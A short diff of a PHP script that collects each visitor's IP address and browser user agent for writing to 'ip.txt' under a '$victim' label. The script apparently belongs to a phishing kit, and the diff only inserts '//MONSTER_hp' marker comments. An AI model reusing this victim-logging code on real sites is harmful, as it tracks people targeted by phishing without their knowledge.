@@ -1,5 +1,5 @@
 <?php
-
+//MONSTER_hp
 if (!empty($_SERVER['HTTP_CLIENT_IP']))
     {
       $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
@@ -14,7 +14,7 @@ else
     }
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
-
+//MONSTER_hp
 
 $file = 'ip.txt';
 $victim = "IP: ";
